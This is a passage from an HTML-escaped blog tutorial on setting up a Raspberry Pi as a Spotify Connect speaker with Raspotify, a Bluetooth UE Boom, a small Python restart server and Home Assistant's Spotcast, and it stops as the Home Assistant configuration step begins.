&amp;lt;p&amp;gt;After installation, edit &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;default&amp;#x2F;raspotify&amp;lt;&amp;#x2F;code&amp;gt; to change some parameters:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Uncomment (remove the # at the beginning) the line that starts with &amp;lt;code&amp;gt;DEVICE_NAME&amp;lt;&amp;#x2F;code&amp;gt; and name your Spotify connect server (e.g. &amp;lt;code&amp;gt;Bathroom Speaker&amp;lt;&amp;#x2F;code&amp;gt;)&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Uncomment (remove the # at the beginning) the line that starts with &amp;lt;code&amp;gt;OPTIONS&amp;lt;&amp;#x2F;code&amp;gt; in order to specify your Spotify premium credentials. This is crucial to allow Home Assistant to play music on this speaker&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;The file should look like this (&amp;lt;strong&amp;gt;while changing every &amp;lt;code&amp;gt;&amp;amp;lt;&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; parameter&amp;lt;&amp;#x2F;strong&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;# &amp;#x2F;etc&amp;#x2F;default&amp;#x2F;raspotify -- Arguments&amp;#x2F;configuration for librespot
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Device name on Spotify Connect
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;DEVICE_NAME=&amp;amp;quot;&amp;amp;lt;Speaker Name&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# The displayed device type in Spotify clients.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Can be &amp;amp;quot;unknown&amp;amp;quot;, &amp;amp;quot;computer&amp;amp;quot;, &amp;amp;quot;tablet&amp;amp;quot;, &amp;amp;quot;smartphone&amp;amp;quot;, &amp;amp;quot;speaker&amp;amp;quot;, &amp;amp;quot;tv&amp;amp;quot;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# &amp;amp;quot;avr&amp;amp;quot; (Audio&amp;#x2F;Video Receiver), &amp;amp;quot;stb&amp;amp;quot; (Set-Top Box), and &amp;amp;quot;audiodongle&amp;amp;quot;.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#DEVICE_TYPE=&amp;amp;quot;speaker&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Bitrate, one of 96 (low quality), 160 (default quality), or 320 (high quality)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#BITRATE=&amp;amp;quot;160&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Additional command line arguments for librespot can be set below.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# See `librespot -h` for more info. Make sure whatever arguments you specify
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# aren&amp;amp;#39;t already covered by other variables in this file. (See the daemon&amp;amp;#39;s
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# config at `&amp;#x2F;lib&amp;#x2F;systemd&amp;#x2F;system&amp;#x2F;raspotify.service` for more technical details.)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# To make your device visible on Spotify Connect across the Internet add your
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# username and password which can be set via &amp;amp;quot;Set device password&amp;amp;quot;, on your
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# account settings, use `--username` and `--password`.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# To choose a different output device (ie a USB audio dongle or HDMI audio out),
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# use `--device` with something like `--device hw:0,1`. Your mileage may vary.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;OPTIONS=&amp;amp;quot;--username &amp;amp;#39;&amp;amp;lt;Put Spotify Premium Username Here&amp;amp;gt;&amp;amp;#39; --password &amp;amp;#39;&amp;amp;lt;Put Spotify Premium Password Here&amp;amp;gt;&amp;amp;#39;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Uncomment to use a cache for downloaded audio files. Cache is disabled by
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# default. It&amp;amp;#39;s best to leave this as-is if you want to use it, since
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# permissions are properly set on the directory `&amp;#x2F;var&amp;#x2F;cache&amp;#x2F;raspotify&amp;amp;#39;.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#CACHE_ARGS=&amp;amp;quot;--cache &amp;#x2F;var&amp;#x2F;cache&amp;#x2F;raspotify&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# By default, the volume normalization is enabled, add alternative volume
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# arguments here if you&amp;amp;#39;d like, but these should be fine.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#VOLUME_ARGS=&amp;amp;quot;--enable-volume-normalisation --volume-ctrl linear --initial-volume=100&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Backend could be set to pipe here, but it&amp;amp;#39;s for very advanced use cases of
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# librespot, so you shouldn&amp;amp;#39;t need to change this under normal circumstances.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#BACKEND_ARGS=&amp;amp;quot;--backend alsa&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;installing-pi-btaudio&amp;quot;&amp;gt;Installing pi-btaudio&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;pi-btaudio is a suite of packages that allow your RPi to connect to UE Boom automatically, and make sure the connection stays active.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Start by going over the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;bablokb&amp;#x2F;pi-btaudio#prerequisites&amp;quot;&amp;gt;prerequisites&amp;lt;&amp;#x2F;a&amp;gt;, make sure to write down the MAC address of your UE Boom. In order to connect to a UE Boom, you must press its Bluetooth pairing button for it to accept new connections.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Once you’re done, follow &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;bablokb&amp;#x2F;pi-btaudio#installation&amp;quot;&amp;gt;their installation steps&amp;lt;&amp;#x2F;a&amp;gt; to install the tools. Edit the configuration file in &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;asound.conf&amp;lt;&amp;#x2F;code&amp;gt; with the following content (&amp;lt;strong&amp;gt;make sure you replace &amp;lt;code&amp;gt;&amp;amp;lt;UE Boom Bluetooth MAC&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; with the one found during prerequisites&amp;lt;&amp;#x2F;strong&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;pcm.!default &amp;amp;quot;bluealsa&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;ctl.!default &amp;amp;quot;bluealsa&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.interface &amp;amp;quot;hci0&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.device &amp;amp;quot;&amp;amp;lt;UE Boom Bluetooth MAC&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.profile &amp;amp;quot;a2dp&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;raspotify-watchdog-restarter&amp;quot;&amp;gt;Raspotify Watchdog Restarter&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Providing credentials as options to Raspotify ensures Home Assistant will be able to connect and play music remotely. But after someone else uses Spotify Connect to cast music into Raspotify - it’s unable to reconnect using the credentials provided in the configuration file.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;To solve this, I wrote a small API server in Python to restart Raspotify once I want to turn it off (when motion sensor turns off).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Start by creating a &amp;lt;code&amp;gt;~&amp;#x2F;watchdog&amp;lt;&amp;#x2F;code&amp;gt; directory and placing the following content in &amp;lt;code&amp;gt;~&amp;#x2F;watchdog&amp;#x2F;server.py&amp;lt;&amp;#x2F;code&amp;gt; (&amp;lt;strong&amp;gt;replace &amp;lt;code&amp;gt;&amp;amp;lt;Secret Restart Password QueryString&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; with some long string that should be kept secret&amp;lt;&amp;#x2F;strong&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;python&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-python &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-python&amp;quot; data-lang=&amp;quot;python&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;os
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;from &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;http.server &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;HTTPServer, BaseHTTPRequestHandler
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;class &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;MyHandler&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;BaseHTTPRequestHandler&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;do_GET&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;.path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;!= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;?&amp;amp;lt;Secret Restart Password QueryString&amp;amp;gt;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.send_response(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;401&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.end_headers()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.wfile.write(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;bytes&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Bye bye&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;utf-8&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# send 200 response
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.send_response(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;200&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# send response headers
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.end_headers()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# send the body of the response
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;os.system(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;sudo systemctl restart raspotify.service&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.wfile.write(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;bytes&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Restarted&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;utf-8&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;httpd &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;HTTPServer((&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;9876&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;), MyHandler)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;httpd.serve_forever()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Then create the file &amp;lt;code&amp;gt;&amp;#x2F;lib&amp;#x2F;systemd&amp;#x2F;system&amp;#x2F;restart_raspotify.service&amp;lt;&amp;#x2F;code&amp;gt; with the following content:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;[Unit]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Description=Restart raspotify service
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;After=multi-user.target
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Conflicts=getty@tty1.service
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;[Service]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Type=simple
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;ExecStart=&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;python3 &amp;#x2F;home&amp;#x2F;pi&amp;#x2F;watchdog&amp;#x2F;server.py
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;StandardInput=tty-force
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;[Install]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;WantedBy=multi-user.target
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;To enable the newly created service, run:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;systemctl enable restart_raspotify.service
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;systemctl start restart_raspotify.service
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;spotcast-on-home-assistant&amp;quot;&amp;gt;Spotcast on Home Assistant&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Spotcast enables Home Assistant to play music on Spotify Connect-enabled devices, like our Raspotify system. Follow the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;fondberg&amp;#x2F;spotcast#installation&amp;quot;&amp;gt;installation steps&amp;lt;&amp;#x2F;a&amp;gt; to install on your Home Assistant instance. After installing, you need to configure Home Assistant to authenticate using your Spotify Premium account by following the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;fondberg&amp;#x2F;spotcast#configuration&amp;quot;&amp;gt;configuration steps&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;After restarting Home Assistant, you’ll be able to use Spotcast to play music on your speaker through Raspotify by calling this Home Assistant service (&amp;lt;strong&amp;gt;replace &amp;lt;code&amp;gt;&amp;amp;lt;Speaker Name&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; with what you specified in &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;default&amp;#x2F;raspotify&amp;lt;&amp;#x2F;code&amp;gt;, and &amp;lt;code&amp;gt;&amp;amp;lt;Spotify Playlist URI&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; with the Spotify-formatted URI such as &amp;lt;code&amp;gt;spotify:album:2PPfl28ysMbOkl2DBJ5Dr4&amp;lt;&amp;#x2F;code&amp;gt; - a good rainforest nature album&amp;lt;&amp;#x2F;strong&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;yaml&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-yaml &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-yaml&amp;quot; data-lang=&amp;quot;yaml&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;data&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;device_name&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;lt;Speaker Name&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;random_song&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;true
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;uri&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;lt;Spotify Playlist URI&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;start_volume&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;15
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;force_playback&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;true
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;service&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;spotcast.start
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;raspotify-restart-via-home-assistant&amp;quot;&amp;gt;Raspotify Restart via Home Assistant&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Edit Home Assistant’s &amp;lt;code&amp;gt;configuration.yaml&amp;lt;&amp;#x2F;code&amp;gt; file (by &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.home-assistant.io&amp;#x2F;getting-started&amp;#x2F;configuration&amp;#x2F;&amp;quot;&amp;gt;installing the File Editor&amp;lt;&amp;#x2F;a&amp;gt; or by any other method) and insert the following to the configuration (&amp;lt;strong&amp;gt;replace &amp;amp;lt;Secret Restart Password QueryString&amp;amp;gt; with what you chose in &amp;lt;code&amp;gt;~&amp;#x2F;watchdog&amp;#x2F;server.py&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;strong&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
